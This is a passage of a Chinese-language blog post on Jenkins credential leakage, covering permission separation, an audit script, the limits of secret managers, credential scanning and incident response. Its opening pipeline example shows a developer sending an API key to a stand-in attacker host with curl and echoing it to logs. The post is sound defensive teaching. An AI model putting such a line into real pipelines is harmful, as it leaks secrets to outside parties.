+                    credentialsId<span class="token punctuation">:</span> <span class="token string">'production-api-key'</span><span class="token punctuation">,</span>
+                    variable<span class="token punctuation">:</span> <span class="token string">'API_KEY'</span>
+                <span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token comment">// 开发人员可以修改流水线以暴露凭证</span>
+                    sh <span class="token string">'echo $API_KEY'</span>
+                    sh <span class="token string">'echo $API_KEY | base64'</span>
+                    sh <span class="token string">'curl https://attacker.com?key=$API_KEY'</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚫 没有权限分离的风险</p><div class="admonition-content"><p><strong>开发人员可以做什么</strong></p>
+<ul>
+<li>修改流水线以将凭证回显到构建日志</li>
+<li>在构建 artifact 中归档凭证</li>
+<li>将凭证发送到外部系统</li>
+<li>通过测试报告提取凭证</li>
+<li>如果被授予访问权限，使用脚本控制台</li>
+</ul>
+<p><strong>为什么这很危险</strong></p>
+<ul>
+<li>开发人员需要执行任务但不需要看到凭证值</li>
+<li>任务配置访问 = 凭证提取能力</li>
+<li>没有技术障碍防止凭证泄露</li>
+<li>完全依赖开发人员的可信度</li>
+<li>单一恶意或被入侵的开发人员账户暴露所有凭证</li>
+</ul>
+</div></div>
+<h4 id="实施权限分离">实施权限分离</h4>
+<p>使用 Role Strategy 插件或 Folder Authorization 插件来分离权限：</p>
+<p><strong>Role Strategy 插件配置：</strong></p>
+<pre class="language-none"><code class="language-none">全局角色：
+  - credential-admin: Credential/Create, Credential/Update, Credential/View, Credential/Delete
+  - developer: Job/Build, Job/Read, Job/Workspace
+  - pipeline-admin: Job/Configure, Job/Create, Job/Delete
+
+项目角色（每个文件夹）：
+  - team-developer: Job/Build, Job/Read, Credential/UseItem
+  - team-lead: Job/Configure, Credential/UseItem
+  - security-admin: Credential/ManageDomains, Credential/Create, Credential/Update</code></pre>
+<div class="admonition success"><p class="admonition-title"><span class="mdi mdi-check-circle-outline admonition-icon"></span>✅ 权限分离的好处</p><div class="admonition-content"><p><strong>凭证管理员</strong></p>
+<ul>
+<li>创建和管理凭证</li>
+<li>查看和更新凭证值</li>
+<li>无法修改任务配置</li>
+<li>通常是安全团队或资深 DevOps</li>
+</ul>
+<p><strong>流水线管理员</strong></p>
+<ul>
+<li>配置和创建任务</li>
+<li>无法查看凭证值</li>
+<li>可以指定任务使用哪些凭证（通过 ID）</li>
+<li>无法通过任务修改提取凭证值</li>
+</ul>
+<p><strong>开发人员</strong></p>
+<ul>
+<li>执行任务并查看构建日志</li>
+<li>无法修改任务配置</li>
+<li>无法查看或管理凭证</li>
+<li>只能通过预先配置的任务使用凭证</li>
+</ul>
+</div></div>
+<h4 id="实际实施">实际实施</h4>
+<p>开发团队的实用权限模型：</p>
+<pre class="language-none"><code class="language-none">文件夹：/production-deployments/
+  凭证：
+    - prod-db-password（由安全团队管理）
+    - prod-api-key（由安全团队管理）
+  
+  权限：
+    - security-team: Credential/Create, Credential/Update, Credential/View, Credential/Delete
+    - devops-leads: Job/Configure, Credential/UseItem（可以使用但不能查看）
+    - developers: Job/Build, Job/Read（可以执行但不能修改）
+
+文件夹：/development/
+  凭证：
+    - dev-db-password（由团队负责人管理）
+    - dev-api-key（由团队负责人管理）
+  
+  权限：
+    - team-leads: Credential/Create, Credential/Update, Job/Configure
+    - developers: Job/Build, Job/Configure, Credential/UseItem</code></pre>
+<div class="admonition anote"><p class="admonition-title"><span class="mdi mdi-note-outline admonition-icon"></span>🎯 关键原则</p><div class="admonition-content"><p><strong>分离防止</strong></p>
+<ul>
+<li>开发人员修改生产流水线以提取凭证</li>
+<li>通过流水线变更意外暴露凭证</li>
+<li>被入侵账户的恶意凭证提取</li>
+<li>不满员工的内部威胁</li>
+</ul>
+<p><strong>分离允许</strong></p>
+<ul>
+<li>开发人员使用凭证执行任务</li>
+<li>流水线管理员配置任务使用哪些凭证</li>
+<li>安全团队管理敏感凭证</li>
+<li>谁访问了哪些凭证的审计轨迹</li>
+</ul>
+<p><strong>重要限制</strong></p>
+<ul>
+<li>如果流水线已经记录凭证，则无法防止凭证泄露</li>
+<li>无法防止脚本控制台访问（单独的权限）</li>
+<li>无法防止通过 artifact 或报告的泄露</li>
+<li>必须与安全流水线实践结合</li>
+<li>流水线管理员仍然可以配置任务以暴露凭证</li>
+</ul>
+</div></div>
+<h4 id="监控和执行">监控和执行</h4>
+<p>必须监控和执行权限分离：</p>
+<pre class="language-groovy" data-language="groovy"><code class="language-groovy"><span class="token comment">// 检查权限分离的审计脚本</span>
+<span class="token keyword">import</span> jenkins<span class="token punctuation">.</span>model<span class="token punctuation">.</span>Jenkins
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>cloudbees<span class="token punctuation">.</span>plugins<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span>*
+<span class="token keyword">import</span> hudson<span class="token punctuation">.</span>security<span class="token punctuation">.</span>*
+
+<span class="token keyword">def</span> jenkins <span class="token operator">=</span> Jenkins<span class="token punctuation">.</span>instance
+<span class="token keyword">def</span> strategy <span class="token operator">=</span> jenkins<span class="token punctuation">.</span><span class="token function">getAuthorizationStrategy</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment">// 检查谁有凭证管理权限</span>
+<span class="token keyword">def</span> credentialAdmins <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token keyword">def</span> jobConfigurers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+
+strategy<span class="token punctuation">.</span><span class="token function">getGrantedPermissions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>each <span class="token punctuation">{</span> permission<span class="token punctuation">,</span> users <span class="token operator">-&gt;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>permission<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">'Credential'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        credentialAdmins<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>permission<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">'Job/Configure'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        jobConfigurers<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">// 如果相同用户同时拥有两种权限，则发出警报</span>
+<span class="token keyword">def</span> overlap <span class="token operator">=</span> credentialAdmins<span class="token punctuation">.</span><span class="token function">intersect</span><span class="token punctuation">(</span>jobConfigurers<span class="token punctuation">)</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>overlap<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    println <span class="token interpolation-string"><span class="token string">"警告：同时拥有凭证和任务配置权限的用户：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token expression">overlap</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"</span></span>
+<span class="token punctuation">}</span></code></pre>
+<div class="admonition tip"><p class="admonition-title"><span class="mdi mdi-lightbulb-on-outline admonition-icon"></span>🔍 执行最佳实践</p><div class="admonition-content"><p><strong>定期审计</strong></p>
+<ul>
+<li>每季审查权限分配</li>
+<li>检查具有过多权限的用户</li>
+<li>验证组织变更后是否维持分离</li>
+<li>审计凭证使用模式</li>
+</ul>
+<p><strong>自动监控</strong></p>
+<ul>
+<li>当用户获得凭证管理权限时发出警报</li>
+<li>监控权限提升尝试</li>
+<li>按用户和任务追踪凭证访问</li>
+<li>检测异常的凭证使用模式</li>
+</ul>
+<p><strong>策略执行</strong></p>
+<ul>
+<li>在安全策略中记录权限模型</li>
+<li>要求批准凭证管理访问</li>
+<li>定期培训权限分离的理由</li>
+<li>权限违规的事件响应计划</li>
+</ul>
+</div></div>
+<p>权限分离是一个关键的防御层，但它并非万无一失。可以配置任务的流水线管理员仍然可以编写暴露凭证的流水线。真正的保护来自于将权限分离与安全流水线实践、代码审查和自动凭证扫描相结合。</p>
+<h3 id="外部机密管理：并非万灵丹">外部机密管理：并非万灵丹</h3>
+<p>外部机密管理系统降低风险，但不能消除泄露向量：</p>
+<pre class="language-groovy" data-language="groovy"><code class="language-groovy"><span class="token comment">// 使用 HashiCorp Vault</span>
+pipeline <span class="token punctuation">{</span>
+    agent any
+    stages <span class="token punctuation">{</span>
+        <span class="token function">stage</span><span class="token punctuation">(</span><span class="token string">'Deploy'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            steps <span class="token punctuation">{</span>
+                script <span class="token punctuation">{</span>
+                    <span class="token comment">// 在运行时从 Vault 检索机密</span>
+                    <span class="token keyword">def</span> secrets <span class="token operator">=</span> <span class="token function">vault</span><span class="token punctuation">(</span>
+                        path<span class="token punctuation">:</span> <span class="token string">'secret/data/myapp'</span><span class="token punctuation">,</span>
+                        engineVersion<span class="token punctuation">:</span> <span class="token number">2</span>
+                    <span class="token punctuation">)</span>
+                    
+                    <span class="token comment">// 如果记录，机密仍然会暴露！</span>
+                    sh <span class="token interpolation-string"><span class="token string">"echo API Key: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token expression">secrets<span class="token punctuation">.</span>api_key</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"</span></span>  <span class="token comment">// 仍然危险</span>
+                    
+                    <span class="token comment">// 机密仍然在 artifact 中暴露</span>
+                    sh <span class="token interpolation-string"><span class="token string">"echo 'key: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token expression">secrets<span class="token punctuation">.</span>api_key</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">' &gt; config.yaml"</span></span>
+                    archiveArtifacts <span class="token string">'config.yaml'</span>  <span class="token comment">// 仍然暴露</span>
+                    
+                    <span class="token comment">// 正确用法 - 没有日志记录或 artifact</span>
+                    sh <span class="token interpolation-string"><span class="token string">"""
+                        set +x
+                        curl -H "Authorization: Bearer </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token expression">secrets<span class="token punctuation">.</span>api_key</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">" \
+                             https://api.example.com/deploy
+                    """</span></span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<div class="admonition warning"><p class="admonition-title"><span class="mdi mdi-alert-outline admonition-icon"></span>⚠️ 外部机密无法防止所有泄露</p><div class="admonition-content"><p><strong>外部机密解决什么</strong></p>
+<ul>
+<li>凭证不在 Jenkins 中静态存储</li>
+<li>集中式凭证管理和轮换</li>
+<li>机密访问的审计日志记录</li>
+<li>短期、动态凭证</li>
+<li>如果 Jenkins 被入侵，减少爆炸半径</li>
+</ul>
+<p><strong>外部机密无法解决什么</strong></p>
+<ul>
+<li>构建日志泄露（如果回显，机密仍会被记录）</li>
+<li>Artifact 泄露（如果写入文件，机密仍会被归档）</li>
+<li>测试报告泄露（机密仍在测试输出中）</li>
+<li>脚本控制台访问（机密在内存中仍可访问）</li>
+<li>API 泄露（机密仍在构建参数/环境中）</li>
+</ul>
+<p><strong>根本真相</strong></p>
+<ul>
+<li>外部机密管理改变机密存储的位置</li>
+<li>它不改变机密在流水线中的使用方式</li>
+<li>所有泄露向量（日志、artifact、报告）仍然存在</li>
+<li>安全流水线实践仍然至关重要</li>
+<li>不能仅依赖外部机密来保证安全</li>
+</ul>
+</div></div>
+<div class="admonition success"><p class="admonition-title"><span class="mdi mdi-check-circle-outline admonition-icon"></span>✅ 外部机密管理的好处</p><div class="admonition-content"><p><strong>与安全实践结合时</strong></p>
+<ul>
+<li>集中控制和审计日志记录</li>
+<li>动态、短期凭证</li>
+<li>更容易的轮换和撤销</li>
+<li>关注点分离</li>
+<li>减少 Jenkins 攻击面</li>
+</ul>
+<p><strong>热门解决方案</strong></p>
+<ul>
+<li>HashiCorp Vault</li>
+<li>AWS Secrets Manager</li>
+<li>Azure Key Vault</li>
+<li>Google Secret Manager</li>
+<li>CyberArk</li>
+</ul>
+<p><strong>关键要求</strong></p>
+<ul>
+<li>必须与安全流水线设计结合</li>
+<li>消除日志记录、artifact 和报告泄露</li>
+<li>外部机密是一层，而非完整解决方案</li>
+</ul>
+</div></div>
+<h2 id="检测和响应">检测和响应</h2>
+<p>即使有预防措施，检测和响应凭证泄露也至关重要。</p>
+<h3 id="自动凭证扫描">自动凭证扫描</h3>
+<p>实施自动扫描以检测暴露的凭证：</p>
+<div class="admonition tip"><p class="admonition-title"><span class="mdi mdi-lightbulb-on-outline admonition-icon"></span>🔍 扫描策略</p><div class="admonition-content"><p><strong>构建日志扫描</strong></p>
+<ul>
+<li>常见凭证格式的正则表达式模式</li>
+<li>API 密钥模式（AWS、GitHub、Slack 等）</li>
+<li>日志中类似密码的字符串</li>
+<li>Base64 编码的凭证</li>
+</ul>
+<p><strong>配置扫描</strong></p>
+<ul>
+<li>扫描任务配置中的硬编码机密</li>
+<li>检查 Jenkins 中的流水线定义</li>
+<li>审计插件配置</li>
+<li>审查全局 Jenkins 配置</li>
+</ul>
+<p><strong>工具和集成</strong></p>
+<ul>
+<li>git-secrets 用于仓库扫描</li>
+<li>truffleHog 用于凭证检测</li>
+<li>Jenkins 特定模式的自定义脚本</li>
+<li>与 CI/CD 流水线集成以进行自动检查</li>
+</ul>
+</div></div>
+<h3 id="事件响应程序">事件响应程序</h3>
+<p>为凭证泄露事件建立明确的程序：</p>
+<div class="admonition anote"><p class="admonition-title"><span class="mdi mdi-note-outline admonition-icon"></span>🚨 事件响应步骤</p><div class="admonition-content"><p><strong>立即行动</strong></p>
+<ol>
+<li>识别暴露的凭证及其范围</li>
+<li>立即轮换被入侵的凭证</li>
+<li>审查访问日志以查找未经授权的使用</li>
+<li>如果无法轮换，则禁用被入侵的账户</li>
+</ol>
+<p><strong>调查</strong></p>
+<ol>
+<li>确定泄露持续时间和访问范围</li>
+<li>识别谁有权访问暴露的凭证</li>
+<li>检查未经授权访问的迹象</li>
+<li>记录时间轴和影响</li>
+</ol>
+<p><strong>补救</strong></p>
+<ol>
+<li>修复泄露的根本原因</li>
+<li>更新流水线以防止再次发生</li>
+<li>实施额外控制</li>
+<li>对受影响的团队进行安全培训</li>
+</ol>
+<p><strong>事后</strong></p>
+<ol>
+<li>记录经验教训</li>
+<li>更新安全程序</li>
+<li>在组织内分享知识</li>
+<li>安排后续审查</li>
+</ol>
+</div></div>
+<h2 id="结论">结论</h2>
+<p>Jenkins 凭证泄露代表现代 CI/CD 流水线中的关键安全风险。使 Jenkins 强大的灵活性——Groovy 脚本、广泛的插件、详细的日志记录——也创造了凭证泄漏的众多途径。从明显的错误（如在构建日志中回显密码）到插件 API 中的细微漏洞，攻击面广泛且不断演变。</p>
+<p>最常见的泄露向量仍然是构建日志，开发人员在调试期间或通过详细命令输出无意中打印凭证。这些日志默认情况下无限期保留，所有开发人员都可访问，并且经常被转发到日志聚合系统，使泄露倍增。脚本控制台提供管理权力，但也使任何有权访问的人都能直接提取凭证。API 端点可能通过任务配置、构建参数和插件特定的漏洞暴露凭证。</p>
+<p>常见的泄露情境展示了凭证保护不足的严重后果。具有默认安全设置的公开可访问 Jenkins 实例可能导致完全的基础设施入侵。长期包含凭证的构建日志使组织面临需要大量审计的未知风险。插件漏洞可能影响数千个安装，许多组织由于兼容性问题而延迟应用补丁。</p>
+<p>保护需要多层防御。安全流水线实践通过谨慎使用 <code>withCredentials</code> 块、禁用命令回显和避免凭证打印来最小化凭证泄露。凭证范围通过限制哪些任务可以访问特定凭证来限制爆炸半径。严格的访问控制和全面的审计日志记录能够检测可疑活动。像 HashiCorp Vault 这样的外部机密管理系统提供动态、短期凭证和集中控制，但它们不能消除通过日志、artifact 或报告的泄露——无论机密存储在哪里，安全流水线设计仍然至关重要。</p>
+<p>检测和响应能力同样关键。自动扫描构建日志和配置可以在攻击者发现之前识别暴露的凭证。明确的事件响应程序确保快速轮换被入侵的凭证，并彻底调查潜在的未经授权访问。定期对 Jenkins 配置、插件和流水线进行安全审计有助于在漏洞被利用之前识别它们。</p>
+<p>「安全即代码」和基础设施自动化的趋势使 Jenkins 安全性变得越来越重要。随着组织将更多凭证整合到 CI/CD 系统中，泄露的影响也在增长。最小权限原则应该指导每个凭证决策：使用文件夹范围的凭证，为每个用例创建单独的凭证，优先使用只读访问，并定期轮换。</p>
+<p>在 Jenkins 中存储凭证之前，问问自己：这个凭证需要在 Jenkins 中吗，还是可以从外部机密管理器检索？谁需要访问这个凭证，我可以更狭窄地限定范围吗？如果这个凭证被暴露，我将如何检测？我的轮换策略是什么？这些问题的答案应该指导你的凭证管理策略，并帮助防止 CI/CD 流水线中的下一次凭证泄露事件。</p>
+<!-- commentbox plugin begins -->
+    <div class="commentbox"></div>
+    <script src="https://unpkg.com/commentbox.io/dist/commentBox.min.js"></script>
+    <script>commentBox('5765834504929280-proj')</script>
+    <!-- commentbox plugin ends -->
+    
+        </div>
+        
+        <footer class="article-footer">
+            
+    <a data-url="https://neo01.com/zh-CN/2021/07/Jenkins-Credentials-Exposure/" data-id="53a0216a" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url').replace("http://","https://"),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+        </footer>
+    </div>
+    <!--script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "author": {
+            "@type": "Person",
+            "name": "Neo Alienson"
+        },
+        "headline": "Jenkins 凭证泄露：CI/CD 流水线中隐藏的安全风险",
+        "image": "https://neo01.com/assets/jenkins/thumbnail.png",
+        "keywords": "DevOps Jenkins Security",
+        "genre": "Development",
+        "datePublished": "2021-07-01",
+        "dateCreated": "2021-07-01",
+        "dateModified": "2025-10-30",
+        "url": "https://neo01.com//zh-CN/2021/07/Jenkins-Credentials-Exposure/",
+        "description": "Jenkins 凭证可能通过构建日志、脚本控制台和 API 端点泄露。了解凭证如何被暴露，以及如何保护你的 CI/CD 流水线。",
+        "wordCount": 5580
+    }
+</script-->
+
+</article>
+
+                        </div>
+                    </section>
+                    
+<aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>关注我 :</p>
+        <ul class="social-links">
+                <li>
+                    <a class="social-tooltip" title="stack-exchange" href="https://stackexchange.com/users/2122053/neo?tab=accounts" target="_blank" rel="noopener">
+                        <i class="icon fa-brands fa-stack-exchange"></i>
+                    </a>
+                </li>
+                <li>
+                    <a class="social-tooltip" title="stack-overflow" href="https://stackoverflow.com/users/1885105/neo" target="_blank" rel="noopener">
+                        <i class="icon fa-brands fa-stack-overflow"></i>
+                    </a>
+                </li>
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/neoalienson" target="_blank" rel="noopener">
+                        <i class="icon fa-brands fa-github"></i>
+                    </a>
+                </li>
+                <li>
+                    <a class="social-tooltip" title="linkedin" href="https://linkedin.com/in/neo01" target="_blank" rel="noopener">
+                        <i class="icon fa-brands fa-linkedin"></i>
+                    </a>
+                </li>
+                <li>
+                    <a class="social-tooltip" title="rss" href="/atom.xml" target="_blank" rel="noopener">
+                        <i class="icon fa fa-rss"></i>
+                    </a>
+                </li>
+        </ul>
+    </div>
+    <div class="widgets-container">
+
+        
+            
+                
+                <div class="widget-wrap widget-list">
+    <h3 class="widget-title">链接</h3>
+    <div class="widget">
+        <ul><li><a href="/zh-CN/ai">AI 游乐场</a></li><li><a href="/zh-CN/tools">工具</a></li><li><a href="/zh-CN/games">游戏</a></li><li><a href="/zh-CN/pages/useful-information">实用信息</a></li><li><a href="/zh-CN/pages/Hexo-Blogging-Cheatsheet">Hexo 博客速查表</a></li></ul>
+    </div>
+</div>
+
+                
+            
+                
+                
+                
+            
+                
+                    <div class="widget-wrap">
+        <h3 class="widget-title">最新文章</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                    <li>
+                        <div class="item-thumbnail">
+                            <a href="/zh-CN/2025/10/Enabling-i18n-in-Hexo/" class="thumbnail">
+        <span style="background-image:url(/assets/hexo/thumbnail.png)" alt="在 Hexo 中启用 i18n：多语言博客完整指南" class="thumbnail-image"></span>
+</a>
+                        </div>
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" style="cursor: default; pointer-events: none;">开发</a></p>
+                            <p class="item-title"><a href="/zh-CN/2025/10/Enabling-i18n-in-Hexo/" class="title">在 Hexo 中启用 i18n：多语言博客完整指南</a></p>
+                            <p class="item-date"><time datetime="2025-10-29T16:00:00.000Z" itemprop="datePublished">2025-10-30</time></p>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="item-thumbnail">
+                            <a href="/zh-CN/2025/10/CISP-Advanced-Security-Topics/" class="thumbnail">
+        <span style="background-image:url(/assets/cisp/thumbnail_80.png)" alt="CISP学习指南：高级安全主题" class="thumbnail-image"></span>
+</a>
+                        </div>
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" style="cursor: default; pointer-events: none;">网络安全</a></p>
+                            <p class="item-title"><a href="/zh-CN/2025/10/CISP-Advanced-Security-Topics/" class="title">CISP学习指南：高级安全主题</a></p>
+                            <p class="item-date"><time datetime="2025-10-22T16:00:00.000Z" itemprop="datePublished">2025-10-23</time></p>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="item-thumbnail">
+                            <a href="/zh-CN/2025/10/CISP-Email-Security/" class="thumbnail">
+        <span style="background-image:url(/assets/cisp/thumbnail_80.png)" alt="CISP学习指南：电子邮件安全与网络协议" class="thumbnail-image"></span>
+</a>
+                        </div>
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" style="cursor: default; pointer-events: none;">网络安全</a></p>
+                            <p class="item-title"><a href="/zh-CN/2025/10/CISP-Email-Security/" class="title">CISP学习指南：电子邮件安全与网络协议</a></p>
+                            <p class="item-date"><time datetime="2025-10-22T16:00:00.000Z" itemprop="datePublished">2025-10-23</time></p>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="item-thumbnail">
+                            <a href="/zh-CN/2025/10/CISP-Access-Control-Audit-WAPI/" class="thumbnail">
+        <span style="background-image:url(/assets/cisp/thumbnail_80.png)" alt="CISP学习指南：访问控制机制、蜜网、审计系统与WAPI" class="thumbnail-image"></span>
+</a>
+                        </div>
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" style="cursor: default; pointer-events: none;">网络安全</a></p>
+                            <p class="item-title"><a href="/zh-CN/2025/10/CISP-Access-Control-Audit-WAPI/" class="title">CISP学习指南：访问控制机制、蜜网、审计系统与WAPI</a></p>
+                            <p class="item-date"><time datetime="2025-10-21T16:00:00.000Z" itemprop="datePublished">2025-10-22</time></p>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="item-thumbnail">
+                            <a href="/zh-CN/2025/10/CISP-China-Information-Security-Laws/" class="thumbnail">
+        <span style="background-image:url(/assets/cisp/thumbnail_80.png)" alt="CISP学习指南：中国信息安全法律法规体系" class="thumbnail-image"></span>
+</a>
+                        </div>
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" style="cursor: default; pointer-events: none;">网络安全</a></p>
+                            <p class="item-title"><a href="/zh-CN/2025/10/CISP-China-Information-Security-Laws/" class="title">CISP学习指南：中国信息安全法律法规体系</a></p>
+                            <p class="item-date"><time datetime="2025-10-21T16:00:00.000Z" itemprop="datePublished">2025-10-22</time></p>
+                        </div>
+                    </li>
+            </ul>
+        </div>
+    </div>
+
+                
+            
+                
+                
+    
+    
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">归档</h3>
+        <div class="widget">
+            <ul class="archive-list">
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2025/">2025</a>
+                    <span class="archive-list-count">73</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2024/">2024</a>
+                    <span class="archive-list-count">25</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2023/">2023</a>
+                    <span class="archive-list-count">16</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2022/">2022</a>
+                    <span class="archive-list-count">18</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2021/">2021</a>
+                    <span class="archive-list-count">14</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2020/">2020</a>
+                    <span class="archive-list-count">13</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2019/">2019</a>
+                    <span class="archive-list-count">12</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2018/">2018</a>
+                    <span class="archive-list-count">2</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2017/">2017</a>
+                    <span class="archive-list-count">5</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2016/">2016</a>
+                    <span class="archive-list-count">4</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2015/">2015</a>
+                    <span class="archive-list-count">6</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2014/">2014</a>
+                    <span class="archive-list-count">7</span>
+                </li>
+            
+                <li class="archive-list-item">
+                    <a class="archive-list-link" href="/zh-CN/archives/2013/">2013</a>
+                    <span class="archive-list-count">2</span>
+                </li>
+            
+            </ul>
+        </div>
+    </div>
+
+
+                
+            
+        
+
+    </div>
+</aside>
+
+
+                </div>
+            </div>
+        </div>
+        
+<footer id="footer">
+    <div class="container">
+        <div class="container-inner">
+            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
+
+            <div class="qrcode-share-wrapper">
+                <div class="qrcode-text">https://neo01.com/l#9ffe2766</div>
+                <img src="/qr/qr-c9a928b1b68382a07f29ec2487791e5c.svg" width="200" height="200" alt="QR Code for https://neo01.com/l#9ffe2766">
+            </div>
+            <div class="credit">
+                <h1 class="logo-wrap">
+                    <a href="/" title="Homepage" class="logo"></a>
+                </h1>
+                
+                <p>© 2025 Neo Alienson. 版权所有.
+                  <a href="/zh-CN/terms-and-conditions">使用条款</a></p>
+                
+            </div>
+            <div class="footer-plugins">
+              
+
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+        
+        
+    
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+        
+
+
+    
+
+
+
+<!-- Custom Scripts -->
+
+
+
+
+        
+    </div>
+<!-- hexo injector body_end start --><script type="text/javascript" src="/js/bundle_last.js"></script><!-- hexo injector body_end end -->
+
